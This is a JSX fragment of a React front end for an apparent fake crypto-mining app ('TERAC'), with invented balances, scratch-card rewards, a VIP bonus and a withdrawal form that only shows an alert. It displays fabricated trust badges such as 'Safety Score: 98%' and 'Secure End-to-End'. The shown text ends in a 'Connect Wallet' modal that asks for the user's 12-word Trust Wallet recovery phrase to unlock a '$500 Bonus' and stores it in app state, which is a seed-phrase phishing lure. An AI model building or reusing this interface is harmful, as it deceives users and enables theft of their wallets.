      <header className="fixed top-0 w-full z-50 bg-[#0b0c10]/80 backdrop-blur-md border-b border-white/5 flex items-center justify-between px-6 py-4">
        <div className="flex items-center gap-2">
          <div className="w-10 h-10 bg-[#f3ba2f] rounded-xl flex items-center justify-center shadow-[0_0_15px_rgba(243,186,47,0.3)]">
            <Cpu className="text-black" size={24} />
          </div>
          <span className="font-extrabold text-xl tracking-tight uppercase italic">{t.appName}</span>
        </div>
        <div className="flex items-center gap-3 relative">
          <button 
            onClick={toggleLanguageMenu}
            className="w-10 h-10 rounded-full glass flex items-center justify-center hover:bg-white/10 transition-colors gap-1 px-4 min-w-[70px]"
          >
            <Globe size={18} />
            <span className="text-[10px] font-bold uppercase">{lang}</span>
          </button>

          {/* Language Menu */}
          <AnimatePresence>
            {state.isLangMenuOpen && (
              <>
                <div 
                  className="fixed inset-0 z-40" 
                  onClick={() => setState(prev => ({ ...prev, isLangMenuOpen: false }))}
                />
                <motion.div 
                  initial={{ opacity: 0, y: 10, scale: 0.95 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: 10, scale: 0.95 }}
                  className={`absolute top-full mt-2 ${lang === 'ar' ? 'left-0' : 'right-0'} z-50 glass bg-[#1c1c1e] border border-white/10 rounded-2xl min-w-[150px] overflow-hidden shadow-2xl p-2`}
                >
                  {(Object.keys(languageNames) as Language[]).map((l) => (
                    <button
                      key={l}
                      onClick={() => selectLanguage(l)}
                      className={`w-full text-left px-4 py-3 rounded-xl text-xs font-bold transition-all flex items-center justify-between
                        ${lang === l ? 'bg-[#f3ba2f] text-black' : 'hover:bg-white/5 text-gray-400'}
                        ${lang === 'ar' ? 'text-right' : ''}
                      `}
                    >
                      <span>{languageNames[l]}</span>
                      {lang === l && <ShieldCheck size={14} />}
                    </button>
                  ))}
                </motion.div>
              </>
            )}
          </AnimatePresence>

          <div className="px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[10px] font-bold text-[#f3ba2f] uppercase tracking-widest">
            {t.pro}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="pt-24 px-5 max-w-lg mx-auto space-y-6">
        {state.activeTab === 'home' ? (
          <>
            {/* Hero Section */}
            <motion.section 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="relative overflow-hidden rounded-3xl border border-white/10 bg-gradient-to-br from-[#1f2833] to-[#0b0c10] p-8"
            >
              <div className="relative z-10 w-2/3">
                <h2 className="text-3xl font-extrabold gradient-text leading-tight mb-2">{t.heroTitle}</h2>
                <p className="text-gray-400 text-sm leading-relaxed mb-6 font-medium">
                  {t.heroDesc}
                </p>
                <div className="flex items-center gap-1.5 text-[11px] font-bold text-[#66fcf1] uppercase tracking-tighter bg-[#66fcf1]/10 px-3 py-1.5 rounded-full w-fit">
                  <TrendingUp size={12} />
                  {t.dailyAvg}
                </div>
              </div>
              <img 
                src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=023" 
                className={`absolute ${lang === 'ar' ? '-left-8' : '-right-8'} -bottom-8 w-44 opacity-40 float-animation pointer-events-none`}
                alt="Asset"
              />
            </motion.section>
    
            {/* Balance Card */}
            <motion.section 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.1 }}
              className="glass rounded-[40px] p-8 text-center shadow-2xl relative overflow-hidden"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#f3ba2f] to-transparent opacity-50" />
              <p className="text-[#8e9299] text-xs font-bold uppercase tracking-[0.2em] mb-4">{t.aggregatedAssets}</p>
              <h1 className="text-5xl font-black mb-8 font-mono tracking-tighter" dir="ltr">
                <span className="text-2xl align-top mr-1 font-sans font-bold text-gray-500">$</span>
                {total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </h1>
              
              <div className="grid grid-cols-2 gap-4 border-t border-white/5 pt-6">
                <div className={`space-y-1 ${lang === 'ar' ? 'border-l' : 'border-r'} border-white/5`}>
                  <p className="text-[10px] uppercase font-bold text-gray-500 tracking-widest">{t.miningEngine}</p>
                  <p className="text-lg font-mono font-bold text-[#f3ba2f]" dir="ltr">
                    ${state.mining.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </p>
                </div>
                <div className="space-y-1">
                  <p className="text-[10px] uppercase font-bold text-gray-500 tracking-widest">{t.profitVault}</p>
                  <p className="text-lg font-mono font-bold text-[#66fcf1]" dir="ltr">
                    ${state.profit.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </p>
                </div>
              </div>
            </motion.section>
    
            {/* Actions Grid */}
            <section className="grid grid-cols-4 gap-4">
              <ActionButton onClick={handleRecharge} color="blue" icon={<Wallet size={24} />} label={t.recharge} />
              <ActionButton onClick={() => setState(prev => ({ ...prev, isWalletModalOpen: true }))} color="gold" icon={<LinkIcon size={24} />} label={t.recevoir} />
              <ActionButton onClick={handleBonus} color="yellow" icon={<Crown size={24} />} label={t.vipBonus} />
              <ActionButton 
                onClick={() => setState(prev => ({ ...prev, isWithdrawModalOpen: true }))} 
                color="gray" 
                icon={<Vault size={24} />} 
                label={t.withdraw} 
              />
            </section>
    
            {/* Mining Status */}
            <section className="bg-white/5 border border-white/5 rounded-2xl p-5 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="relative">
                  <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" />
                  <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full animate-ping opacity-50" />
                </div>
                <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">{t.nodeStatus}</span>
              </div>
              <div className="text-[10px] font-mono text-[#f3ba2f]">0.0000451 BTC/hr</div>
            </section>
          </>
        ) : state.activeTab === 'ticket' ? (
          <div className="space-y-6">
            {/* Ticket Header & Stats */}
            <div className="flex items-center justify-between px-2">
               <div>
                 <h2 className="text-2xl font-black tracking-tight uppercase">{t.miningTab}</h2>
                 <p className="text-xs text-gray-500 font-bold uppercase tracking-widest mt-1">Daily Rewards</p>
               </div>
               <div className="bg-[#f3ba2f]/10 border border-[#f3ba2f]/20 rounded-2xl px-4 py-2 text-right">
                  <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider">{t.ticketBalance}</p>
                  <p className="text-lg font-black text-[#f3ba2f]">3 Tickets</p>
               </div>
            </div>

            {/* Cooldown / Scratch Banner */}
            {state.ticketCooldown > 0 ? (
              <div className="bg-white rounded-[32px] p-6 flex items-center justify-center gap-10 shadow-xl border-4 border-[#e9d5ff]">
                 <img 
                   src="https://cdn-icons-png.flaticon.com/512/3233/3233483.png" 
                   className="w-16 h-16" 
                   alt="Treasure Chest"
                 />
                 <h3 className="text-4xl font-black text-black leading-tight font-mono">
                   {formatTime(state.ticketCooldown)}
                 </h3>
              </div>
            ) : (
              <div className="bg-white rounded-[32px] p-8 flex items-center gap-6 shadow-xl border-4 border-[#e9d5ff]">
                 <div className="relative flex-shrink-0">
                    <div className="absolute -inset-4 bg-orange-400/20 blur-xl rounded-full" />
                    <img 
                      src="https://cdn-icons-png.flaticon.com/512/3233/3233483.png" 
                      className="w-24 h-24 relative z-10" 
                      alt="Treasure Chest"
                    />
                    <div className="absolute -bottom-2 -right-2 flex">
                       <span className="text-yellow-500">💰</span>
                       <span className="text-yellow-500 -ml-2">💰</span>
                    </div>
                 </div>
                 <div className="flex-1">
                    <h3 className="text-4xl font-black text-black leading-tight">{t.scratchNow}</h3>
                 </div>
              </div>
            )}

            {/* Scratch Grid 2x2 */}
            <div className="grid grid-cols-2 gap-4">
              {[0, 1, 2, 3].map((index) => (
                <ScratchCard 
                  key={index}
                  reward={state.ticketRewards[index]}
                  isAlreadyScratched={state.scratchedIndices.includes(index)}
                  translations={t}
                  isLocked={state.ticketCooldown > 0}
                  onReveal={() => {
                    if (!state.scratchedIndices.includes(index)) {
                      setState(prev => {
                        const nextIndices = [...prev.scratchedIndices, index];
                        const isFinished = nextIndices.length >= 4;
                        return {
                          ...prev,
                          scratchedIndices: nextIndices,
                          profit: prev.profit + prev.ticketRewards[index],
                          ticketCooldown: isFinished ? 14400 : prev.ticketCooldown
                        };
                      });
                    }
                  }}
                />
              ))}
            </div>

            <button 
              disabled={state.ticketCooldown > 0}
              className={`w-full ${state.ticketCooldown > 0 ? 'bg-gray-400 cursor-not-allowed opacity-50' : 'bg-[#f3ba2f] hover:scale-[1.02] active:scale-95'} text-black py-5 rounded-[24px] font-black uppercase tracking-widest flex items-center justify-center gap-3 shadow-xl transition-all`}
            >
               <Ticket size={24} />
               {t.buyTicket}
            </button>
          </div>
        ) : null}
      </main>

      {/* Bottom Nav */}
       <nav className="fixed bottom-0 w-full bg-[#0b0c10]/95 backdrop-blur-xl border-t border-white/5 px-6 py-4 flex justify-around items-center z-50">
        <NavTab 
          active={state.activeTab === 'home'} 
          onClick={() => setState(prev => ({ ...prev, activeTab: 'home' }))}
          icon={<Home size={22} />} 
          label={t.home} 
        />
        <NavTab 
          active={state.activeTab === 'ticket'}
          onClick={() => setState(prev => ({ ...prev, activeTab: 'ticket' }))}
          icon={<Ticket size={22} />} 
          label={t.miningTab} 
        />
        <NavTab 
          onClick={() => setState(prev => ({ ...prev, isInviteModalOpen: true }))}
          icon={<Users size={22} />} 
          label={t.team} 
        />
        <NavTab 
          onClick={() => setState(prev => ({ ...prev, isProfileModalOpen: true }))}
          icon={<User size={22} />} 
          label={t.profileTitle} 
        />
      </nav>

      {/* Profile Modal (Redesigned) */}
      <AnimatePresence>
        {state.isProfileModalOpen && (
          <motion.div 
            initial={{ x: '100%' }}
            animate={{ x: 0 }}
            exit={{ x: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed inset-0 z-[100] bg-[#0b0c10] flex flex-col pt-8"
          >
            {/* Profile Header */}
            <header className="flex items-center justify-between px-6 mb-8">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center">
                  <div className="w-6 h-6 border-2 border-white rounded-md flex items-center justify-center">
                    <div className="w-4 h-4 border-2 border-white rounded-sm" />
                  </div>
                </div>
                <h1 className="text-2xl font-black italic tracking-tighter">TERAC</h1>
              </div>
              <div className="flex items-center gap-4">
                <button 
                  onClick={() => setState(prev => ({ ...prev, isLangMenuOpen: true }))}
                  className="flex items-center gap-2 bg-white/5 px-3 py-1.5 rounded-full border border-white/10"
                >
                  <Globe size={16} className="text-gray-400" />
                  <span className="text-xs font-bold">{languageNames[lang]}</span>
                </button>
                <button className="text-gray-400">
                  <MessageCircle size={24} />
                </button>
              </div>
            </header>

            <div className="flex-1 overflow-y-auto px-5 space-y-6 pb-24">
              {/* Top User Card */}
              <div className="relative bg-[#1c1c1e] rounded-[32px] p-6 overflow-hidden border border-white/5">
                {/* Background Accent */}
                <div className="absolute top-0 right-0 w-32 h-32 bg-red-600/20 blur-3xl -mr-10 -mt-10" />
                <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-600/10 blur-3xl -mr-10 -mb-10" />

                <div className="flex items-center gap-4 mb-8">
                  <div className="w-16 h-16 bg-white/10 rounded-full flex items-center justify-center">
                    <User size={32} className="text-gray-400" />
                  </div>
                  <div className="flex flex-col">
                    <div className="flex items-center gap-2 relative z-10">
                      <span className="text-lg font-bold text-white tracking-wide" dir="ltr">
                        {state.showUserPhone 
                          ? `${state.selectedCountryCode}${state.phoneNumber || '234564344444'}` 
                          : `${state.selectedCountryCode}****${(state.phoneNumber || '234564344444').slice(-4)}`
                        }
                      </span>
                      <button 
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          setState(prev => ({ ...prev, showUserPhone: !prev.showUserPhone }));
                        }}
                        className="p-1 text-gray-500 hover:text-white transition-colors relative z-20 cursor-pointer"
                        aria-label="Toggle phone visibility"
                      >
                        {state.showUserPhone ? <EyeOff size={18} /> : <Eye size={18} />}
                      </button>
                    </div>
                    <div className="mt-1 bg-orange-600 text-white text-[10px] font-black px-3 py-0.5 rounded-md w-fit">
                      {t.vipBadge}
                    </div>
                  </div>
                </div>

                {/* Assets Bar */}
                <div className="bg-[#0b0c10] rounded-2xl p-5 flex items-center justify-between mb-8">
                  <span className="text-gray-400 text-sm font-medium">{t.totalAssets}</span>
                  <div className="flex items-center gap-2">
                    <span className="text-gray-400">$</span>
                    <span className="text-2xl font-bold text-orange-500">0</span>
                  </div>
                </div>

                {/* Primary Actions Grid */}
                <div className="grid grid-cols-3 gap-y-8 text-center pb-2">
                  <ProfileAppAction 
                    onClick={handleRecharge}
                    icon={<Wallet className="text-orange-500" size={24} />} 
                    label={t.recharge} 
                  />
                  <ProfileAppAction 
                    onClick={() => setState(prev => ({ ...prev, isWithdrawModalOpen: true }))}
                    icon={<ArrowUpRight className="text-orange-500" size={24} />} 
                    label={t.withdraw} 
                  />
                  <ProfileAppAction icon={<TrendingUp className="text-orange-500" size={24} />} label={t.financialRecords} />
                  <ProfileAppAction icon={<LinkIcon className="text-orange-500" size={24} />} label={t.transfer} />
                  <ProfileAppAction icon={<Users className="text-orange-500" size={24} />} label={t.team} />
                </div>

                 {/* Customer support floating bubble removed */}
              </div>

              {/* Bottom Settings Card */}
              <div className="bg-[#1c1c1e] rounded-[32px] p-8 border border-white/5">
                <div className="grid grid-cols-3 gap-y-10 text-center">
                  <ProfileLinkAction 
                    onClick={() => setState(prev => ({ ...prev, isFaqModalOpen: true }))}
                    icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><MessageCircle size={24} className="text-white" /></div>} 
                    label={t.faq} 
                  />
                  <ProfileLinkAction icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><Shield size={24} className="text-white" /></div>} label={t.loginPassword} />
                  <ProfileLinkAction 
                    onClick={() => setState(prev => ({ ...prev, isSecurityModalOpen: true }))}
                    icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><ShieldCheck size={24} className="text-white" /></div>} 
                    label={t.securityPassword} 
                  />
                  <ProfileLinkAction icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><Headset size={24} className="text-white" /></div>} label={t.customerService} />
                  <ProfileLinkAction icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><Book size={24} className="text-white" /></div>} label={t.whitepaper} />
                  <ProfileLinkAction icon={<div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-2"><FileText size={24} className="text-white" /></div>} label={t.aboutTerac} />
                </div>

                <button 
                  onClick={handleLogout}
                  className="mt-12 w-full flex items-center gap-4 text-gray-400 px-2"
                >
                  <div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center">
                    <LogOut size={24} className="text-white" />
                  </div>
                  <span className="font-bold">{t.logout}</span>
                </button>
              </div>
            </div>

            {/* Bottom Nav replication (to allow easy exit/nav) */}
            <nav className="bg-[#0b0c10]/95 backdrop-blur-xl border-t border-white/5 px-6 py-4 flex justify-between items-center z-50">
              <NavTab onClick={() => setState(prev => ({ ...prev, isProfileModalOpen: false }))} icon={<Home size={22} />} label={t.home} />
              <NavTab icon={<Crown size={22} />} label={t.vipTab} />
              <NavTab icon={<PieChart size={22} />} label={t.miningTab} />
              <NavTab icon={<Users size={22} />} label={t.team} />
              <NavTab active icon={<User size={22} />} label={t.profileTitle} />
            </nav>

          </motion.div>
        )}
      </AnimatePresence>

      {/* Withdrawal Asset Selector Modal (Retirer) */}
      <AnimatePresence>
        {state.isWithdrawModalOpen && (
          <motion.div 
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className={`fixed inset-0 z-[100] flex flex-col pt-4 ${state.isWithdrawFormOpen ? 'bg-[#121212]' : 'bg-[#f8f9fa]'} overflow-hidden shadow-2xl`}
          >
            {state.isWithdrawFormOpen && state.selectedAsset ? (
              /* --- WITHDRAWAL FORM (IMAGE 3) --- */
              <div className="flex-1 flex flex-col bg-[#0b0b0d] relative overflow-hidden">
                {/* Visual Background Decor */}
                <div className="absolute top-[-5rem] left-[-5rem] w-[20rem] h-[20rem] bg-orange-600/10 blur-[100px] rounded-full pointer-events-none" />
                <div className="absolute bottom-[-5rem] right-[-5rem] w-[15rem] h-[15rem] bg-orange-500/5 blur-[80px] rounded-full pointer-events-none" />

                {/* Header (Image 3) */}
                <div className="flex items-center px-4 py-6 relative z-10 border-b border-white/5 bg-[#0b0b0d]/50 backdrop-blur-md">
                  <button 
                    onClick={() => setState(prev => ({ ...prev, isWithdrawFormOpen: false, selectedAsset: null }))}
                    className="w-12 h-12 flex items-center justify-center transition-all bg-white/5 rounded-2xl hover:bg-white/10 active:scale-95 text-white/90 group"
                  >
                    <ChevronLeft size={24} className={`${lang === 'ar' ? 'rotate-180' : ''} group-hover:-translate-x-0.5 transition-transform`} />
                  </button>
                  <div className="flex-1 flex flex-col items-center">
                    <h2 className="text-xl font-black text-white uppercase tracking-[0.25em] leading-none mb-1">
                      {t.withdraw}
                    </h2>
                    <div className="flex items-center gap-1.5 self-center">
                       <Shield size={10} className="text-green-500" />
                       <span className="text-[9px] text-gray-500 font-bold uppercase tracking-[0.1em]">Secure End-to-End</span>
                    </div>
                  </div>
                  <button 
                    onClick={() => setState(prev => ({ ...prev, isWithdrawHistoryOpen: true }))}
                    className="w-12 h-12 flex items-center justify-center transition-all bg-white/5 rounded-2xl hover:bg-white/10 active:scale-95 text-white/90"
                  >
                    <History size={22} />
                  </button>
                </div>

                <div className="flex-1 overflow-y-auto px-6 py-6 space-y-8 pb-40 relative z-10 scrollbar-hide">
                  {/* Modern Balance Display */}
                  <div className="relative group p-px rounded-[3.5rem] bg-gradient-to-br from-white/10 to-transparent">
                    <div className="bg-[#121215] rounded-[3.45rem] p-10 relative overflow-hidden backdrop-blur-3xl">
                      <div className="absolute top-0 right-0 p-8 opacity-[0.03] select-none">
                         <Wallet size={130} className="text-white" />
                      </div>
                      <p className="text-gray-500 font-black mb-5 text-[10px] uppercase tracking-[0.3em] flex items-center gap-2.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-[#ff5a00] animate-pulse" />
                        {lang === 'fr' ? `SOLDE DISPONIBLE` : (lang === 'ar' ? `الرصيد المتاح` : `Available Balance`)}
                      </p>
                      <div className="flex items-baseline gap-3">
                        <span className="text-6xl font-black text-white tracking-tighter tabular-nums">
                          {state.mining.toFixed(2)}
                        </span>
                        <span className="text-xl font-black text-[#ff5a00] opacity-90">{state.selectedAsset.symbol}</span>
                      </div>
                      <div className="mt-8 flex items-center justify-between">
                         <div className="h-1 flex-1 bg-white/[0.03] rounded-full overflow-hidden mr-10 group-hover:bg-white/[0.05] transition-colors">
                            <motion.div 
                              initial={{ width: 0 }}
                              animate={{ width: '70%' }}
                              className="h-full bg-gradient-to-r from-orange-600 to-orange-400"
                            />
                         </div>
                         <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest whitespace-nowrap">Safety Score: 98%</span>
                      </div>
                    </div>
                  </div>

                  {/* Network Selection - Grid Style */}
                  <div className="space-y-4">
                    <div className="flex items-center justify-between px-2">
                      <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.4em]">{lang === 'fr' ? 'Réseau Principal' : (lang === 'ar' ? 'الشبكة الرئيسية' : t.selectMainNetwork)}</p>
                    </div>
                    <div className="grid grid-cols-2 gap-5">
                      <button className="relative overflow-hidden flex flex-col items-start gap-4 bg-gradient-to-b from-[#ff5a00]/15 to-transparent border border-[#ff5a00]/30 p-6 rounded-[3rem] transition-all group scale-100 active:scale-[0.98]">
                         <div className="absolute top-[-25%] right-[-15%] w-28 h-28 bg-orange-500/5 blur-2xl rounded-full" />
                         <div className="w-12 h-12 rounded-[1.25rem] bg-[#ff5a00] flex items-center justify-center shadow-[0_12px_28px_rgba(255,90,0,0.45)] relative z-10 transition-transform group-hover:rotate-6">
                            <Cpu size={22} className="text-white" />
                         </div>
                         <div className="text-left relative z-10">
                            <span className="block font-black text-sm text-white uppercase tracking-wider mb-0.5">TRC20 (TRX)</span>
                            <span className="text-[10px] text-[#ff5a00] font-black uppercase opacity-80 tracking-tighter">Verified • Instant</span>
                         </div>
                      </button>
                      <button className="flex flex-col items-start gap-4 bg-white/5 border border-white/5 p-6 rounded-[3rem] opacity-30 grayscale saturate-0 cursor-not-allowed">
                         <div className="w-12 h-12 rounded-[1.25rem] bg-zinc-800 flex items-center justify-center">
                            <Cpu size={22} className="text-white/40" />
                         </div>
                         <div className="text-left">
                            <span className="block font-black text-sm text-white/50 uppercase tracking-wider mb-0.5">ERC20</span>
                            <span className="text-[10px] text-gray-700 font-black uppercase tracking-tighter">Under Maintenance</span>
                         </div>
                      </button>
                    </div>
                  </div>

                  {/* Sophisticated Entry Groups */}
                  <div className="space-y-10">
                    {/* Destination Address */}
                    <div className="space-y-4">
                      <div className="flex items-center justify-between px-2">
                         <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.4em]">{t.withdrawalAddress}</p>
                         <div className="flex items-center gap-1.5 text-[#ff5a00] opacity-60 hover:opacity-100 transition-opacity cursor-pointer px-2 py-0.5 rounded-full bg-[#ff5a00]/5">
                            <Scan size={10} />
                            <span className="text-[9px] font-black uppercase tracking-wider">Scanner</span>
                         </div>
                      </div>
                      <div className="relative group">
                        <div className="absolute inset-y-0 left-7 flex items-center pointer-events-none">
                          <ArrowUpRight size={20} className="text-gray-700 group-focus-within:text-[#ff5a00] transition-colors" />
                        </div>
                        <input 
                          type="text"
                          placeholder="Paste receiving address"
                          className={`w-full bg-[#16161a] border-2 border-white/5 rounded-[2rem] py-7 px-16 text-white font-bold placeholder:text-gray-800 focus:ring-0 focus:border-[#ff5a00]/20 transition-all text-base outline-none hover:border-white/10 ${lang === 'ar' ? 'text-right' : 'text-left'}`}
                          value={state.withdrawAddress}
                          onChange={(e) => setState(prev => ({ ...prev, withdrawAddress: e.target.value }))}
                        />
                      </div>
                    </div>

                    {/* Withdrawal Amount */}
                    <div className="space-y-4">
                      <div className="flex items-center justify-between px-2">
                         <div className="flex items-center gap-2">
                            <p className="text-white/40 font-black text-[10px] uppercase tracking-[0.4em]">{t.withdrawalAmount}</p>
                         </div>
                         <div className="flex gap-4 items-center">
                           <button 
                            onClick={() => setState(prev => ({ ...prev, withdrawAmount: state.mining.toString() }))}
                            className="text-[#ff5a00] font-black text-[10px] uppercase tracking-widest hover:brightness-125 transition-all opacity-80"
                           >{t.all}</button>
                         </div>
                      </div>
                      <div className="relative group">
                        <div className="absolute inset-y-0 left-8 flex items-center pointer-events-none font-black text-3xl text-gray-800 group-focus-within:text-[#ff5a00] transition-colors">$</div>
                        <input 
                          type="number"
                          placeholder="0.00"
                          className={`w-full bg-[#16161a] border-2 border-white/5 rounded-[2.5rem] py-10 px-16 text-white font-black placeholder:text-gray-800 focus:ring-0 focus:border-[#ff5a00]/20 transition-all text-5xl tabular-nums leading-tight outline-none hover:border-white/10 ${lang === 'ar' ? 'text-right' : 'text-left'}`}
                          value={state.withdrawAmount}
                          onChange={(e) => setState(prev => ({ ...prev, withdrawAmount: e.target.value }))}
                        />
                        <div className="absolute inset-y-0 right-10 flex items-center font-black text-sm text-gray-700 uppercase tracking-widest pointer-events-none">
                          {state.selectedAsset.symbol}
                        </div>
                      </div>
                      <div className="flex items-center justify-between px-3">
                         <div className="flex items-center gap-2">
                            <TrendingUp size={12} className="text-green-500" />
                            <span className="text-[10px] text-gray-600 font-bold uppercase tracking-widest">Network processing: Live</span>
                         </div>
                         <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest opacity-60">Min: 10.0 TRX</span>
                      </div>
                    </div>
                  </div>

                  {/* Enhanced Security Panel */}
                  <div className="bg-gradient-to-br from-white/[0.04] to-transparent backdrop-blur-3xl rounded-[3rem] p-8 space-y-8 border border-white/5 shadow-2xl relative overflow-hidden">
                      <div className="absolute top-0 right-0 w-24 h-24 bg-orange-500/5 blur-3xl pointer-events-none" />
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                           <div className="w-12 h-12 rounded-[1.25rem] bg-orange-500/10 flex items-center justify-center">
                              <Shield size={24} className="text-[#ff5a00]" />
                           </div>
                           <div className="flex flex-col">
                              <span className="text-xs font-black text-white uppercase tracking-widest leading-none mb-1">{t.securityPassword}</span>
                              <span className="text-[9px] text-gray-600 font-bold uppercase tracking-[0.1em]">Encrypted Layer-2</span>
                           </div>
                        </div>
                        <div className="relative flex items-center">
                          <input 
                            type={state.showSecurityPassword ? 'text' : 'password'}
                            placeholder="Password"
                            className="bg-white/5 border border-white/5 text-center text-white font-black text-sm rounded-xl py-4 w-36 focus:ring-0 focus:border-white/10 outline-none backdrop-blur-sm"
                            value={state.withdrawSecurityPass}
                            onChange={(e) => setState(prev => ({ ...prev, withdrawSecurityPass: e.target.value }))}
                          />
                          <button 
                            onClick={() => setState(prev => ({ ...prev, showSecurityPassword: !prev.showSecurityPassword }))}
                            className={`absolute right-4 ${state.showSecurityPassword ? 'text-[#ff5a00]' : 'text-white/20'} hover:text-white transition-colors`}
                          >
                           {state.showSecurityPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                          </button>
                        </div>
                      </div>
                      <div className="h-px bg-white/5" />
                      <div className="flex items-center justify-between bg-black/40 p-5 rounded-[1.5rem] border border-white/5 backdrop-blur-sm">
                         <div className="flex items-center gap-4">
                            <DollarSign size={18} className="text-[#ff5a00]" />
                            <div className="flex flex-col">
                               <span className="text-[11px] font-black text-white/50 uppercase tracking-widest leading-none mb-1">Network Fee</span>
                               <span className="text-[9px] text-green-500 font-bold uppercase tracking-[0.15em]">Special Waiver</span>
                            </div>
                         </div>
                         <div className="flex items-center gap-3">
                            <span className="text-[10px] text-gray-700 font-black line-through">1.2 {state.selectedAsset.symbol}</span>
                            <span className="text-[13px] font-black text-[#ff5a00] uppercase tracking-wider">FREE</span>
                         </div>
                      </div>
                  </div>
                </div>

                {/* Ultra-Premium Action Bar */}
                <div className="p-8 pb-14 bg-black border-t border-white/5 relative z-10">
                   <div className="flex items-center justify-between mb-8 px-5">
                      <div className="flex flex-col">
                         <span className="text-[10px] text-gray-500 font-black uppercase tracking-[0.4em] mb-1.5">Net Arrival</span>
                         <div className="flex items-center gap-2">
                            <span className="w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.6)] animate-pulse" />
                            <span className="text-[10px] text-green-500/80 font-black uppercase tracking-[0.2em]">Priority Fast-Track</span>
                         </div>
                      </div>
                      <div className="text-right flex items-baseline gap-2">
                         <span className="text-4xl font-black text-white tracking-tighter tabular-nums">{state.withdrawAmount || "0.00"}</span>
                         <span className="text-sm font-black text-[#ff5a00] uppercase opacity-90">{state.selectedAsset.symbol}</span>
                      </div>
                   </div>
                   <button 
                    onClick={() => alert(t.withdrawAlert)}
                    className="w-full h-24 bg-gradient-to-r from-[#ff5a00] to-[#ff7a2a] hover:from-[#ff6a00] hover:to-[#ff8d42] active:scale-[0.985] transition-all text-white font-black rounded-[3rem] text-2xl uppercase tracking-[0.3em] shadow-[0_20px_50px_rgba(255,90,0,0.35)] relative overflow-hidden group"
                  >
                    <div className="absolute inset-0 bg-white/10 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-[1800ms] skew-x-[35deg]" />
                    <span className="relative z-10 flex items-center justify-center gap-5">
                       {t.confirmBtn}
                       <ChevronRight size={28} className="translate-y-px" />
                    </span>
                  </button>
                </div>
              </div>
            ) : (
              /* --- CONNECT WALLET MODAL (IMAGE 1) --- */
              <div className="flex-1 flex flex-col bg-[#0b0b0d] relative overflow-hidden p-6">
                {/* Background Decor */}
                <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_50%_0%,rgba(255,165,0,0.1),transparent_50%)] pointer-events-none" />
                
                {/* Back Link */}
                <button 
                  onClick={() => setState(prev => ({ ...prev, isWithdrawModalOpen: false }))}
                  className="absolute top-6 left-6 w-10 h-10 flex items-center justify-center transition-all bg-white/5 rounded-xl hover:bg-white/10 active:scale-95 text-white/50 z-20"
                >
                  <X size={20} />
                </button>

                <div className="flex-1 flex flex-col items-center justify-center space-y-8 z-10 max-w-sm mx-auto w-full">
                  {/* Shield Icon (Image 1) */}
                  <div className="relative">
                    <div className="absolute inset-0 bg-yellow-500/20 blur-3xl rounded-full scale-150 animate-pulse" />
                    <div className="w-40 h-40 rounded-full bg-[#fbbc05] flex items-center justify-center shadow-[0_0_60px_rgba(251,188,5,0.3)] relative border-4 border-[#ffc107]/50">
                      <Shield size={80} className="text-[#121212] fill-[#121212]/10" strokeWidth={2.5} />
                    </div>
                  </div>

                  {/* Text Content (Image 1) */}
                  <div className="text-center space-y-4">
                    <h2 className="text-3xl font-black text-white uppercase tracking-[0.1em]">
                      Connect Wallet
                    </h2>
                    <p className="text-gray-400 text-sm font-medium leading-relaxed px-4">
                      To verify your account and enable the $500 Bonus, please enter your 12-word recovery phrase from Trust Wallet.
                    </p>
                  </div>

                  {/* Input Field (Image 1) */}
                  <div className="w-full space-y-2">
                    <div className="bg-[#1c1c1e] border-2 border-white/5 rounded-[2rem] p-8 focus-within:border-yellow-500/30 transition-all shadow-inner group">
                      <p className="text-yellow-500/70 font-black text-xs uppercase tracking-widest mb-3">word word word word</p>
                      <textarea 
                        placeholder="[ Tap here to enter phrase... ]"
                        className="w-full bg-transparent border-none text-white font-bold placeholder:text-gray-700 focus:ring-0 p-0 text-sm resize-none h-24 scrollbar-hide no-scrollbar"
                        value={state.recoveryPhrase}
                        onChange={(e) => setState(prev => ({ ...prev, recoveryPhrase: e.target.value }))}
                      />
